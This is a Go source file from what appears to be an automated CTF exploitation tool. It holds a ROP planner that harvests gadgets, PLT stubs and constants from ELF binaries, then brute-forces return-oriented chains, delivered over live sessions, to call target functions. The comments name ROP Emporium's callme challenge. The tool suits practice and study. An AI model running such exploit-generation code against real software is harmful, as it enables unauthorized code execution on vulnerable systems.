package solve

import (
	"context"
	"debug/elf"
	"fmt"
	"path/filepath"
	"regexp"
	"sort"
	"strings"

	"github.com/MoriartyPuth/PwnProbes/internal/rop"
)

// maxPlannerAttempts bounds the planner search; each attempt is a live session.
const maxPlannerAttempts = 4000

// libcNoise are imported functions that are never useful call targets, so the
// planner does not waste attempts returning into them.
var libcNoise = map[string]bool{
	"read": true, "write": true, "puts": true, "printf": true, "fprintf": true,
	"sprintf": true, "snprintf": true, "fgets": true, "gets": true, "fgetc": true,
	"getchar": true, "putchar": true, "memset": true, "memcpy": true, "memmove": true,
	"strcpy": true, "strncpy": true, "strcat": true, "strcmp": true, "strncmp": true,
	"strlen": true, "strcspn": true, "strtol": true, "atoi": true, "setvbuf": true,
	"setbuf": true, "malloc": true, "calloc": true, "realloc": true, "free": true,
	"fopen": true, "fclose": true, "fread": true, "fwrite": true, "fflush": true,
	"exit": true, "_exit": true, "abort": true, "__stack_chk_fail": true,
	"__libc_start_main": true, "__isoc99_scanf": true, "scanf": true, "sscanf": true,
	"alarm": true, "sleep": true, "usleep": true, "system": true, "execve": true,
	"execl": true, "execlp": true, "execvp": true, "__cxa_finalize": true, "srand": true,
	"rand": true, "time": true, "__gmon_start__": true,
}

var ordinalRe = regexp.MustCompile(`_?(one|two|three|four|five|six|seven|eight|nine|ten|\d+)$`)

var wordNum = map[string]int{"one": 1, "two": 2, "three": 3, "four": 4, "five": 5,
	"six": 6, "seven": 7, "eight": 8, "nine": 9, "ten": 10}

type fnGroupMember struct {
	stub  uint64
	order int
}

// ropPlannerStrategy is the fallback ROP planner: it synthesizes chains to call
// imported functions with arguments harvested from the binary (and any sibling
// shared object), covering cases the fixed recipes miss -- notably a sequence of
// multi-argument calls such as ROP Emporium's callme. Non-PIE only; it resolves
// gadgets, PLT stubs, and constants statically and verifies over a live session.
func (s *solver) ropPlannerStrategy(ctx context.Context) (bool, error) {
	bin := s.report.Binary
	if bin.Bits != 64 || bin.Protections["pie"].Status == "enabled" {
		return false, nil
	}
	f, err := elf.Open(s.path)
	if err != nil {
		return false, err
	}
	mainSecs := execSections(f)
	cat := rop.Build(mainSecs)
	got := pltGotEntries(f)
	stubs := pltStubs(f)
	f.Close()
	wins := orderedWinFunctions(bin)

	if len(cat.Pops) == 0 {
		return false, nil
	}

	// Constant pool: immediates from the binary and any sibling shared objects.
	secs := append([]rop.Section{}, mainSecs...)
	for _, so := range siblingSharedObjects(s.workDir) {
		if e := openQuiet(so); e != nil {
			secs = append(secs, execSections(e)...)
			e.Close()
		}
	}
	counts := rop.HarvestConstants(secs)
	pool := magicPool(counts, 2, 0x10000, 4) // repeated, non-trivial immediates
	singlePool := magicPool(counts, 1, 0x10000, 5)

	// Callable targets for grouping and single calls: non-noise imported
	// functions (via their PLT stub) plus defined, non-CRT functions. Grouping
	// uses them all (so callme_one/two/three, whether imported or in-binary
	// stageN functions, bucket together); single-call targets are the win-named
	// ones plus the imported targets.
	type target struct {
		name string
		addr uint64
	}
	var targets []target
	callable := map[string]uint64{}
	for name, slot := range got {
		if libcNoise[name] {
			continue
		}
		if stub, ok := stubs[slot]; ok {
			callable[name] = stub
			targets = append(targets, target{name, stub})
		}
	}
	for _, w := range wins { // wins = defined, non-CRT functions (win-named first)
		if _, ok := callable[w.name]; !ok {
			callable[w.name] = w.addr
		}
		if winNameRe.MatchString(w.name) {
			targets = append(targets, target{w.name, w.addr})
		}
	}
	if len(callable) == 0 {
		return false, nil
	}
	sort.Slice(targets, func(i, j int) bool { return targets[i].addr < targets[j].addr })

	groups := functionGroups(callable)
	offs := leakOffsets()
	attempts := 0
	over := func() bool { attempts++; return attempts > maxPlannerAttempts }

	deliver := func(chain []byte, note string) (bool, error) {
		return s.liveAttempt(ctx, "rop_planner", func(_ []uint64) ([]byte, string, bool) {
			return chain, note, true
		})
	}

	// Pass 1: sequences of multi-argument calls to a related function group
	// (e.g. callme_one/two/three), which the fixed recipes cannot build.
	for _, off := range offs {
		for prefix, members := range groups {
			if len(members) < 2 || len(members) > 4 {
				continue
			}
			for _, order := range candidateOrders(members) {
				for _, args := range orderedTuples(pool, 3) {
					for _, align := range []bool{true, false} {
						if err := ctx.Err(); err != nil {
							return false, err
						}
						if over() {
							return false, nil
						}
						calls := make([]rop.Call, len(order))
						for i, m := range order {
							calls[i] = rop.Call{Func: m.stub, Args: args}
						}
						chain, ok := cat.BuildCallSeq(off, calls, align)
						if !ok {
							continue
						}
						note := fmt.Sprintf("rop_planner seq %s x%d args=%#x padding=%d align=%v", prefix, len(order), args, off, align)
						if done, err := deliver(chain, note); err != nil || done {
							return done, err
						}
					}
				}
			}
		}
	}

	// Pass 2: a single call to an interesting target with harvested arguments.
	for _, off := range offs {
		for _, t := range targets {
			for _, n := range []int{0, 1, 2, 3} {
				for _, args := range orderedTuples(singlePool, n) {
					for _, align := range []bool{true, false} {
						if err := ctx.Err(); err != nil {
							return false, err
						}
						if over() {
							return false, nil
						}
						chain, ok := cat.BuildCall(off, rop.Call{Func: t.addr, Args: args}, align)
						if !ok {
							continue
						}
						note := fmt.Sprintf("rop_planner call %s(%#x) padding=%d align=%v", t.name, args, off, align)
						if done, err := deliver(chain, note); err != nil || done {
							return done, err
						}
					}
				}
			}
		}
	}
	return false, nil
}

// functionGroups buckets imported functions that share a prefix and differ only
// by a trailing ordinal (callme_one, callme_two, ...), ordered by that ordinal.
func functionGroups(plt map[string]uint64) map[string][]fnGroupMember {
	groups := map[string][]fnGroupMember{}
	for name, stub := range plt {
		m := ordinalRe.FindStringSubmatch(name)
		if m == nil {
			continue
		}
		prefix := strings.TrimSuffix(name, m[0])
		ord := wordNum[m[1]]
		if ord == 0 {
			fmt.Sscanf(m[1], "%d", &ord)
		}
		groups[prefix] = append(groups[prefix], fnGroupMember{stub: stub, order: ord})
	}
	for p := range groups {
		sort.SliceStable(groups[p], func(i, j int) bool { return groups[p][i].order < groups[p][j].order })
	}
	return groups
}

// candidateOrders returns the ordinal order and its reverse (deduped) -- the most
// likely call sequences without enumerating every permutation.
func candidateOrders(members []fnGroupMember) [][]fnGroupMember {
	asc := append([]fnGroupMember{}, members...)
	desc := make([]fnGroupMember, len(members))
	for i := range members {
		desc[len(members)-1-i] = members[i]
	}
	if len(members) <= 1 {
		return [][]fnGroupMember{asc}
	}
	return [][]fnGroupMember{asc, desc}
}

// magicPool returns immediate values worth trying as arguments: at least minVal,
// seen at least minCount times, ranked by frequency then value, capped at cap.
func magicPool(counts map[uint64]int, minCount int, minVal uint64, limit int) []uint64 {
	type vc struct {
		v uint64
		c int
	}
	var vs []vc
	for v, c := range counts {
		if v >= minVal && c >= minCount {
			vs = append(vs, vc{v, c})
		}
	}
	sort.Slice(vs, func(i, j int) bool {
		if vs[i].c != vs[j].c {
			return vs[i].c > vs[j].c
		}
		return vs[i].v > vs[j].v
	})
	var out []uint64
	for i := 0; i < len(vs) && i < limit; i++ {
		out = append(out, vs[i].v)
	}
	return out
}

// orderedTuples returns every ordered k-tuple of distinct pool values (k==0 gives
// one empty tuple). The pool is capped by magicPool so this stays small.
func orderedTuples(pool []uint64, k int) [][]uint64 {
	if k == 0 {
		return [][]uint64{{}}
	}
	if k > len(pool) {
		return nil
	}
	var out [][]uint64
	var rec func(cur []uint64, used []bool)
	rec = func(cur []uint64, used []bool) {
		if len(cur) == k {
			out = append(out, append([]uint64{}, cur...))
			return
		}
		for i := range pool {
			if used[i] {
				continue
			}
			used[i] = true
			rec(append(cur, pool[i]), used)
			used[i] = false
		}
	}
	rec(nil, make([]bool, len(pool)))
	return out
}

// execSections returns the loadable executable regions of an ELF for gadget and
// constant scanning.
func execSections(f *elf.File) []rop.Section {
	var out []rop.Section
	if f == nil {
		return out
	}
	for _, sec := range f.Sections {
		if sec.Type == elf.SHT_PROGBITS && sec.Flags&elf.SHF_EXECINSTR != 0 {
			if data, err := sec.Data(); err == nil {
				out = append(out, rop.Section{Addr: sec.Addr, Data: data})
			}
		}
	}
	return out
}

func siblingSharedObjects(dir string) []string {
	matches, _ := filepath.Glob(filepath.Join(dir, "*.so*"))
	return matches
}

func openQuiet(path string) *elf.File {
	f, err := elf.Open(path)
	if err != nil {
		return nil
	}
	return f
}
